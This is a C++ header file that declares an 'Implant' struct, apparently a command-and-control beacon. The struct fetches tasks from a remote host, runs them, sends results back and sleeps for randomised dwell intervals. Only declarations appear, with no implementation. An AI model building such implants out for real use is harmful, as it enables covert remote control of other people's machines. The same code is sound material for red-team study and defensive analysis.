/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 */
#pragma once

#include <boost/asio.hpp>
#include "results.h"
#include "tasks.h"
#include <atomic>
#include <boost/property_tree/ptree.hpp>
#include <future>
#include <mutex>
#include <random>
#include <string>
#include <string_view>
#include <vector>

struct Implant {
  Implant(std::string host, std::string service,
          boost::asio::io_context &io_context);
  void serve();
  void set_mean_dwell(double mean_dwell);
  void set_running(bool is_running);

private:
  std::future<void> task_thread;
  std::vector<Task> tasks;
  std::mutex task_mutex, results_mutex;
  [[nodiscard]] std::string send_results();
  void parse_tasks(const std::string &response);
  void service_tasks();
  boost::property_tree::ptree results;
  const std::string host, service;
  boost::asio::io_context &io_context;
  std::atomic_bool is_running;
  std::exponential_distribution<double> dwell_distribution_seconds;
  std::random_device device;
};

[[nodiscard]] std::string make_request(std::string_view host,
                                       std::string_view port,
                                       std::string_view payload,
                                       boost::asio::io_context &io_context);
